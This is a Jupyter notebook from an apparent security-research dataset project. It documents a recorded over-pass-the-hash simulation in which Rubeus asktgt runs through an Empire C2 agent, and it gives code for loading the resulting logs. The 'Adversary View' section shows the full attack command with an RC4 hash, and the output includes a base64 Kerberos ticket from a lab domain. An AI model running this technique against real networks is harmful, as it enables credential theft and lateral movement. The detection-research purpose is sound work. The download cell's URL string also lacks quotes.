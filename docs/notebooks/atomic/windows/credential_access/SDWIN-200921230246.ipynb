{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f9a84db3",
   "metadata": {},
   "source": [
    "# Rubeus Elevated ASKTGT CreateNetOnly"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b6ccdc4e",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ba542499",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/03/19 |\n",
    "| Modification Date | 2020/09/21 |\n",
    "| Tactics           | [TA0006](https://attack.mitre.org/tactics/TA0006) |\n",
    "| Techniques        | [T1003.003](https://attack.mitre.org/techniques/T1003/003) |\n",
    "| Tags              | Over-Pass-The-Hash,Not Touching LSASS |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "41257c0b",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries crafting raw AS-REQ (TGT request) traffic for a specific user and encryption key (/rc4, /aes128, /aes256, or /des) to request TGTs without touching lsass."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5f443075",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "81c1f720",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_shell_rubeus_asktgt_createnetonly.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_shell_rubeus_asktgt_createnetonly.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/empire_shell_rubeus_asktgt_createnetonly.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/empire_shell_rubeus_asktgt_createnetonly.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a57925ee",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dc3e7766",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6cf32577",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [shell](None) |\n",
    "| binary | Rubeus | [asktgt](https://github.com/GhostPack/Rubeus) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bf288d52",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: G6BYHU4F) > shell C:\\users\\sbeavers\\Desktop\\Rubeus.exe asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /createnetonly:C:\\Windows\\System32\\cmd.exe\n",
    "[*] Tasked 4EH9PC5S to run TASK_SHELL\n",
    "[*] Agent 4EH9PC5S tasked with task ID 4\n",
    "(Empire: 4EH9PC5S) > \n",
    "______        _                      \n",
    "  (_____ \\      | |                     \n",
    "  _____) )_   _| |__  _____ _   _  ___ \n",
    "  |  __  /| | | |  _ \\| ___ | | | |/___)\n",
    "  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n",
    "  |_|   |_|____/|____/|_____)____/(___/\n",
    "\n",
    "  v1.5.0 \n",
    "\n",
    "[*] Action: Ask TGT\n",
    "\n",
    "[*] Showing process : False\n",
    "[+] Process         : 'C:\\Windows\\System32\\cmd.exe' successfully created with LOGON_TYPE = 9\n",
    "[+] ProcessID       : 10064\n",
    "[+] LUID            : 0x42e7ba4\n",
    "\n",
    "[*] Using rc4_hmac hash: 81d310fa34e6a56a31145445891bb7b8\n",
    "[*] Target LUID : 70155172\n",
    "[*] Building AS-REQ (w/ preauth) for: 'theshire.local\\pgustavo'\n",
    "[+] TGT request successful!\n",
    "[*] base64(ticket.kirbi):\n",
    "\n",
    "      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\n",
    "      MBgbBmtyYnRndBsOdGhlc2hpcmUubG9jYWw=\n",
    "[*] Target LUID: 0x42e7ba4\n",
    "[+] Ticket successfully imported!\n",
    "\n",
    "  ServiceName           :  krbtgt/theshire.local\n",
    "  ServiceRealm          :  THESHIRE.LOCAL\n",
    "  UserName              :  pgustavo\n",
    "  UserRealm             :  THESHIRE.LOCAL\n",
    "  StartTime             :  9/21/2020 11:03:07 PM\n",
    "  EndTime               :  9/22/2020 9:03:07 AM\n",
    "  RenewTill             :  9/28/2020 11:03:07 PM\n",
    "  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n",
    "  KeyType               :  rc4_hmac\n",
    "  Base64(key)           :  TqCSqXQzrd62vesN78SIDA==\n",
    "\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: 4EH9PC5S) > \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4baacc51",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c82715cd",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2fe48181",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_shell_rubeus_asktgt_createnetonly.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fde7b759",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9cb671f3",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "62c5c5f1",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3dfeb637",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b40ff55a",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/GhostPack/Rubeus#example-over-pass-the-hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
